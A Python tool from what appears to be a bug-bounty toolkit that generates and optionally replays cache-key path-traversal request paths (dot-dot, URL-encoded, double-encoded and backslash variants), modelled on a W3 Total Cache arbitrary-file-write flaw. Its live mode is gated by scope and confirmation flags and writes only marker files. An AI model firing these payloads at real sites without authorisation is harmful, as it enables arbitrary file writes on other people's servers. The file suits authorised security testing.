#!/usr/bin/env python3
"""Cache-key path traversal discovery track (CVE-2026-18051 class).

Cache plugins and frameworks build cache file paths from the request path.
When that path is not validated, a crafted request path (``/..%2f..%2f..``)
escapes the cache root and the cache *writes a file outside it* — the W3
Total Cache page-cache-key flaw (CVE-2026-18051) is an unauthenticated
arbitrary file write / ``.htaccess`` overwrite of exactly this shape.

This track has two modes, matching the project's planner/runner split:

1. **Offline planning (default).** Given a cache-key construction spec and
   source request paths, it generates bounded traversal request paths across
   a deterministic family set (dot-dot, URL-encoded, double-encoded,
   backslash, extra-dot, dot-slash), applies the spec's sanitization and
   input decoding, and classifies each as escaping the cache root or not.
   Nothing is sent.

2. **Gated lab replay.** With ``--scope-file`` + ``--confirm-active`` +
   ``--base-url``, each escaping probe is replayed against a lab host. Every
   probe carries a unique marker filename (``bwtr-<hash>.html``); after the
   crafted request, the runner requests the marker's resolved location and a
   never-written control path. Marker served + control 404 = escape
   confirmed (SIGNAL); both 404 = refuted; otherwise UNKNOWN with the
   deterministic next check. Verification is read-only and only ever touches
   files the probe itself caused — it never overwrites ``.htaccess`` or any
   existing file, and escape above the web root is left as a lab file check.

All requests run through the execution controller as READ actions.

Usage:
  python3 tools/cache_traversal.py --target T --spec w3tc-page-cache --urls-file recon/T/urls.txt --output-dir recon/T/cache-traversal
  python3 tools/cache_traversal.py --target T --spec w3tc-page-cache --urls-file U --base-url https://lab --scope-file S --confirm-active --json
"""

from __future__ import annotations

import argparse
import hashlib
import json
import ntpath
import posixpath
import sys
import urllib.parse
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional, Sequence, Tuple

try:
    from tools.core.medium_safety import path_open_text
except Exception:  # pragma: no cover - tools.* not always importable
    def path_open_text(path, mode="r", **kw):  # type: ignore[no-redef]
        return open(path, mode, encoding=kw.get("encoding", "utf-8"),
                     errors=kw.get("errors", "replace"))

SCHEMA_VERSION = "bugwolf-cache-traversal-v1"
MARKER_PREFIX = "bwtr"
CONTROL_PREFIX = "bwtr-control"

# Maximum representative request bases and total probes per plan.
MAX_BASES = 3
DEFAULT_MAX_PROBES = 48


@dataclass
class CacheKeySpec:
    """How a request path becomes a cache file path.

    ``cache_root`` is expressed relative to the web root (e.g.
    ``wp-content/cache/page`` for W3 Total Cache). ``construction``:

    - ``raw`` — the (decoded, sanitized) request path is the relative cache
      path directly (``cache_root + path``);
    - ``segment`` — the request path becomes directories plus ``index.html``
      (page-cache style: ``cache_root + path + /index.html``);
    - ``hash`` — only ``md5(path)`` reaches the filesystem (control: not
      traversable).

    ``sanitization`` runs on the *raw* path before decoding — the order of
    operations matters, because a filter that strips literal ``..`` is
    bypassed by fully-encoded dots (``%2e%2e%2f``): the filter sees no ``..``
    and the decode that happens later, at cache-key build time, produces
    ``../``. ``decode_passes`` models servers that URL-decode more than once
    (the double-encoded family only escapes with two passes).
    """

    name: str
    cache_root: str
    construction: str = "raw"
    sanitization: str = "none"      # none | strip_dotdot
    decode_input: bool = True       # url-decode the request path before building the key
    decode_passes: int = 1          # how many times the key builder decodes the input
    windows: bool = False           # backslash separators in the cache root

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "CacheKeySpec":
        return cls(**{k: data[k] for k in ("name", "cache_root") if k in data},
                   **{k: data[k] for k in data if k not in ("name", "cache_root")})


# Canonical constructions. The W3TC entry models the page-cache-key shape of
# CVE-2026-18051 (request path -> cache file under wp-content/cache/page).
KNOWN_SPECS: Dict[str, CacheKeySpec] = {
    "w3tc-page-cache": CacheKeySpec(
        name="w3tc-page-cache", cache_root="wp-content/cache/page",
        construction="raw"),
    "raw-suffix": CacheKeySpec(
        name="raw-suffix", cache_root="cache", construction="raw"),
    "segment-index": CacheKeySpec(
        name="segment-index", cache_root="cache", construction="segment"),
    "sanitized-raw": CacheKeySpec(
        name="sanitized-raw", cache_root="cache", construction="raw",
        sanitization="strip_dotdot"),
    "hashed": CacheKeySpec(
        name="hashed", cache_root="cache", construction="hash"),
    "windows-cache": CacheKeySpec(
        name="windows-cache", cache_root=r"cache\page", construction="raw",
        windows=True),
}

# Traversal payload families. ``{depth}`` is the number of parent steps needed
# to escape the cache root for the chosen base; each family is a different
# spelling of the same escape, and the lab replay decides which survive the
# server's own normalization.
def _family_templates(depth: int) -> Sequence[Tuple[str, str]]:
    return (
        ("dotdot", "../" * depth + "{marker}"),
        ("encoded_slash", ("..%2f" * depth) + "{marker}"),
        ("encoded_dot_slash", ("%2e%2e%2f" * depth) + "{marker}"),
        ("double_encoded", ("%252e%252e%252f" * depth) + "{marker}"),
        ("backslash", ("..\\" * depth) + "{marker}"),
        ("backslash_encoded", ("..%5c" * depth) + "{marker}"),
        ("extra_dots", ("....//" * depth) + "{marker}"),
        ("dot_slash", ("..././" * depth) + "{marker}"),
    )


def _normpath(spec: CacheKeySpec, value: str) -> str:
    """Native-separator normalization: backslash families only traverse on
    Windows-style roots (the lab replay decides what real servers accept)."""
    return (ntpath if spec.windows else posixpath).normpath(value)


def _depth(cache_root: str) -> int:
    return len([part for part in cache_root.split("/") if part and part != "."])


def _sanitize(value: str, mode: str) -> str:
    if mode == "strip_dotdot":
        return value.replace("..", "")
    return value


def construct_cache_path(spec: CacheKeySpec, request_path: str) -> str:
    """Return the cache path relative to ``cache_root`` for a request path.

    Order of operations: sanitize the raw input first, then URL-decode — so a
    filter running before decoding is shown as bypassable by ``..%2f``.
    """
    path = request_path
    path = _sanitize(path, spec.sanitization)
    if spec.decode_input:
        for _ in range(max(1, spec.decode_passes)):
            path = urllib.parse.unquote(path)
    path = path.lstrip("/")
    if spec.construction == "hash":
        return hashlib.md5(path.encode("utf-8", errors="replace")).hexdigest() + ".html"
    if spec.construction == "segment":
        return path.rstrip("/") + "/index.html"
    return path


def resolve_cache_path(spec: CacheKeySpec, cache_target: str) -> str:
    """Web-root-relative path the cache target normalizes to."""
    return _normpath(spec, spec.cache_root + "/" + cache_target)


def escapes_cache_root(spec: CacheKeySpec, resolved: str) -> bool:
    """True when the resolved cache path leaves ``cache_root``."""
    root = _normpath(spec, spec.cache_root)
    return not (resolved == root or resolved.startswith(root + "/"))


@dataclass
class TraversalProbe:
    """One crafted request path and its computed cache-key outcome."""

    probe_id: str
    target: str
    spec: str
    family: str
    request_path: str            # crafted request path (attacker input)
    decoded_path: str            # what reaches key construction after decoding
    cache_target: str            # cache path relative to cache_root
    resolved_path: str           # web-root-relative normalized cache path
    escaped: bool
    verifiable: bool             # escaped AND still under the web root (HTTP-checkable)
    marker: str                  # unique filename this probe causes
    verify_path: str             # URL path to confirm the marker exists
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def _marker(probe_id: str) -> str:
    return f"{MARKER_PREFIX}-{probe_id[:10]}.html"


def _control_marker(seed: str) -> str:
    digest = hashlib.sha256(("control|" + seed).encode()).hexdigest()
    return f"{CONTROL_PREFIX}-{digest[:10]}.html"


def _probe_id(target: str, spec_name: str, family: str, base: str, seed: int) -> str:
    raw = "|".join([target, spec_name, family, base, str(seed)])
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def representative_bases(urls: Iterable[str], *, max_bases: int = MAX_BASES) -> List[str]:
    """Directory bases from recon URLs (path up to the last segment)."""
    bases: List[str] = []
    for url in urls:
        try:
            path = urllib.parse.urlparse(url.strip()).path
        except ValueError:
            path = url.strip()
        if not path or path == "/":
            continue
        directory = path.rsplit("/", 1)[0]
        base = "/" + directory.strip("/") if directory.strip("/") else "/"
        if base not in bases:
            bases.append(base)
        if len(bases) >= max_bases:
            break
    return bases or ["/"]


def build_plan(target: str, spec: CacheKeySpec, request_paths: Iterable[str], *,
               seed: int = 0, max_probes: int = DEFAULT_MAX_PROBES) -> List[TraversalProbe]:
    """Generate bounded, deterministic escape probes (offline, no network).

    Only escaping probes are emitted; non-escaping families are refuted by
    construction and reported in ``manifest`` notes. ``seed`` makes markers
    and probe ids reproducible across runs.
    """
    probes: List[TraversalProbe] = []
    seen = set()
    base_depth = _depth(spec.cache_root)
    for base in representative_bases(request_paths):
        depth = base_depth + len([part for part in base.split("/") if part])
        for family, template in _family_templates(depth):
            if len(probes) >= max_probes:
                return probes
            probe_id = _probe_id(target, spec.name, family, base, seed)
            if probe_id in seen:
                continue
            seen.add(probe_id)
            marker = _marker(probe_id)
            payload = template.format(marker=marker)
            request_path = (base.rstrip("/") + "/" + payload) if base != "/" else "/" + payload
            decoded = urllib.parse.unquote(request_path) if spec.decode_input else request_path
            cache_target = construct_cache_path(spec, request_path)
            resolved = resolve_cache_path(spec, cache_target)
            escaped = escapes_cache_root(spec, resolved)
            if not escaped:
                continue
            verifiable = not (resolved.startswith("..") or resolved.startswith("/"))
            notes = []
            if family in ("encoded_slash", "encoded_dot_slash") and spec.decode_input:
                notes.append("URL-decoding before key construction turns this into ../ "
                             "— the server must decode the path before building the key.")
            if family == "double_encoded" and spec.decode_passes < 2:
                notes.append("Requires a second URL-decoding pass at key-build time "
                             "(spec decode_passes >= 2); the lab replay decides.")
            if family in ("backslash", "backslash_encoded") and not spec.windows:
                notes.append("Backslash separators only traverse on Windows-style cache roots.")
            if spec.sanitization != "none" and ".." in decoded and family != "dotdot":
                notes.append("Survives the naive '..' filter because filtering runs before decoding.")
            probes.append(TraversalProbe(
                probe_id=probe_id, target=target, spec=spec.name, family=family,
                request_path=request_path, decoded_path=decoded,
                cache_target=cache_target, resolved_path=resolved,
                escaped=True, verifiable=verifiable, marker=marker,
                verify_path=resolved, notes=notes,
            ))
    return probes


# ---------------------------------------------------------------------------
# Gated lab replay
# ---------------------------------------------------------------------------


@dataclass
class TraversalResult:
    probe_id: str
    state: str                 # signal | refuted | unknown | error | lab_check
    craft_status: int
    verify_status: int
    control_status: int
    hypothesis: str

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def classify_replay(craft_status: int, verify_status: int,
                    control_status: int, *, verifiable: bool) -> Tuple[str, str]:
    """Deterministic classification of the marker-based replay.

    The marker file only exists if the crafted request escaped the cache root
    and wrote outside it, so ``verify 2xx + control 404`` is a confirmed
    directory escape. A 0 status means the transport itself failed (error).
    """
    if verify_status == 0 or control_status == 0 or craft_status == 0:
        return ("error", "transport failure while replaying the crafted path")
    if not verifiable:
        return ("lab_check",
                "escape resolves above the web root — confirm the file's existence "
                "with a read-only lab filesystem check")
    if 200 <= verify_status < 300 and control_status == 404:
        return ("signal",
                "the marker file is served at the escaped location while the control "
                "404s — the crafted request path escaped the cache root and wrote "
                "outside it (CVE-2026-18051 class). Demonstrate bounded impact "
                "without overwriting existing files.")
    if verify_status == 404 and control_status == 404:
        return ("refuted",
                "neither the marker nor the control is served — no file escaped the "
                "cache root for this request path")
    return ("unknown",
            "ambiguous result (marker and control responses differ from the "
            "expected pair) — re-run with the deterministic next check")


class TraversalRunner:
    """Replay escaping probes against a lab host and classify the outcome."""

    def run(self, probes: Sequence[TraversalProbe], *,
            craft: Callable[[str], Any], verify: Callable[[str], Any],
            base_url: str = "", verify_base: str = "",
            control_path: str = "") -> List[TraversalResult]:
        results: List[TraversalResult] = []
        for probe in probes:
            craft_obs = craft(probe.request_path)
            verify_obs = verify(probe.verify_path)
            control_obs = verify(control_path)
            state, hypothesis = classify_replay(
                craft_obs.status, verify_obs.status, control_obs.status,
                verifiable=probe.verifiable)
            results.append(TraversalResult(
                probe_id=probe.probe_id, state=state,
                craft_status=craft_obs.status,
                verify_status=verify_obs.status,
                control_status=control_obs.status,
                hypothesis=hypothesis,
            ))
        return results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _load_spec(value: str) -> CacheKeySpec:
    if value in KNOWN_SPECS:
        return KNOWN_SPECS[value]
    path = Path(value)
    if path.is_file():
        try:
            return CacheKeySpec.from_dict(json.loads(path.read_text()))
        except (json.JSONDecodeError, TypeError, ValueError) as exc:
            raise SystemExit(f"[!] invalid spec file {value}: {exc}")
    raise SystemExit(
        f"[!] unknown spec {value!r}; use --list-specs or a JSON spec file")


def _load_urls(path: Optional[str]) -> List[str]:
    if not path:
        return []
    return Path(path).read_text(errors="replace").splitlines()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Cache-key path traversal discovery track (CVE-2026-18051 class)")
    parser.add_argument("--target", required=True)
    parser.add_argument("--spec", default="w3tc-page-cache",
                        help="CacheKeySpec name (see --list-specs) or a JSON spec file")
    parser.add_argument("--list-specs", action="store_true",
                        help="Print the known cache-key construction specs and exit")
    parser.add_argument("--urls-file", help="Recon URL list for representative request bases")
    parser.add_argument("--seed", type=int, default=0,
                        help="Deterministic marker/probe seed")
    parser.add_argument("--max-probes", type=int, default=DEFAULT_MAX_PROBES)
    parser.add_argument("--output-dir", default="cache-traversal")
    parser.add_argument("--json", action="store_true")
    # Live replay gates.
    parser.add_argument("--base-url", default="",
                        help="Lab base URL the crafted requests are sent to")
    parser.add_argument("--verify-base", default="",
                        help="Web-root base URL for marker/control verification (default: --base-url)")
    parser.add_argument("--scope-file", help="Authorization scope file (required for live replay)")
    parser.add_argument("--confirm-active", action="store_true",
                        help="Explicitly authorize live replay probes")
    args = parser.parse_args()

    if args.list_specs:
        for name, spec in KNOWN_SPECS.items():
            print(f"  {name:<18} root={spec.cache_root!r} construction={spec.construction} "
                  f"sanitization={spec.sanitization} decode={spec.decode_input} "
                  f"windows={spec.windows}")
        return

    spec = _load_spec(args.spec)
    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    urls = _load_urls(args.urls_file)
    probes = build_plan(args.target, spec, urls,
                        seed=args.seed, max_probes=args.max_probes)

    live = bool(args.base_url)
    if live and (not args.scope_file or not args.confirm_active):
        print("[!] live replay requires --scope-file and --confirm-active "
              "(crafted paths are active probes)", file=sys.stderr)
        raise SystemExit(2)

    if not live:
        manifest = {
            "schema": SCHEMA_VERSION,
            "target": args.target,
            "spec": spec.to_dict(),
            "mode": "offline_plan",
            "probes": len(probes),
            "max_probes": args.max_probes,
            "control_path": "",
            "notes": [
                "Escaping request paths only; families refuted by construction are omitted.",
                "Replay requires --scope-file --confirm-active --base-url against a lab host.",
            ],
        }
        with path_open_text(out_dir / "cache-traversal-plan.jsonl", "w") as stream:
            for probe in probes:
                stream.write(json.dumps(probe.to_dict(), sort_keys=True) + "\n")
        (out_dir / "manifest.json").write_text(
            json.dumps(manifest, indent=2) + "\n")
        if args.json:
            print(json.dumps({"schema": SCHEMA_VERSION, "target": args.target,
                              "mode": "offline_plan", "spec": spec.to_dict(),
                              "probes": [p.to_dict() for p in probes]},
                             indent=2, default=str))
        else:
            print(f"[*] Cache-key traversal plan for {args.target} "
                  f"(spec {spec.name}, cache_root {spec.cache_root!r})")
            print(f"    escaping probes: {len(probes)}  "
                  f"(bases: {len(representative_bases(urls))})")
            for probe in probes[:20]:
                print(f"    [{probe.family}] {probe.request_path}  ->  "
                      f"resolves {probe.resolved_path}  "
                      f"verifiable={probe.verifiable}")
            print(f"    plan written to {out_dir / 'cache-traversal-plan.jsonl'}")
        return

    try:
        import tools.hunt as hunt
        from tools.execution_controller import (
            ActionClass, ActiveExecutionController, ExecutionPolicy,
        )
    except ImportError as exc:
        print(f"[!] live replay unavailable: {exc}", file=sys.stderr)
        raise SystemExit(2)

    verify_base = args.verify_base or args.base_url
    policy = ExecutionPolicy(
        target=args.target, scope_file=args.scope_file,
        allow_active=True, confirm_active=True,
        allowed_actions={ActionClass.PASSIVE, ActionClass.READ},
        max_requests=len(probes) * 3 + 2,
    )
    hunt.ACTIVE_CONTROLLER = ActiveExecutionController(policy)
    session = hunt.HuntSession(name="cache_traversal", target=args.target)

    def transport(url: str):
        return hunt.curl_fetch_observation("GET", url, session)

    control_path = "/" + _control_marker(args.target + str(args.seed))
    runner = TraversalRunner()
    results = runner.run(
        probes,
        craft=lambda request_path: transport(args.base_url.rstrip("/") + request_path),
        verify=lambda verify_path: transport(verify_base.rstrip("/") + "/" + verify_path.lstrip("/")),
        control_path=control_path,
    )

    payload = {
        "schema": SCHEMA_VERSION,
        "target": args.target,
        "mode": "live",
        "spec": spec.to_dict(),
        "control_path": control_path,
        "results": [r.to_dict() for r in results],
        "signals": sum(1 for r in results if r.state == "signal"),
        "refuted": sum(1 for r in results if r.state == "refuted"),
        "unknowns": sum(1 for r in results if r.state in ("unknown", "lab_check")),
    }
    (out_dir / "cache-traversal-results.jsonl").write_text(
        "".join(json.dumps(r.to_dict(), sort_keys=True) + "\n" for r in results))
    (out_dir / "manifest.json").write_text(json.dumps(payload, indent=2) + "\n")

    if args.json:
        print(json.dumps(payload, indent=2, default=str))
    else:
        print(f"[*] Live cache-key traversal results for {args.target}")
        for probe, result in zip(probes, results):
            flag = " ⚡SIGNAL" if result.state == "signal" else ""
            print(f"  [{result.state}]{flag} {probe.family} "
                  f"craft={result.craft_status} verify={result.verify_status} "
                  f"control={result.control_status}")
            if result.state in ("signal", "unknown", "lab_check"):
                print(f"      {result.hypothesis}")


if __name__ == "__main__":
    main()
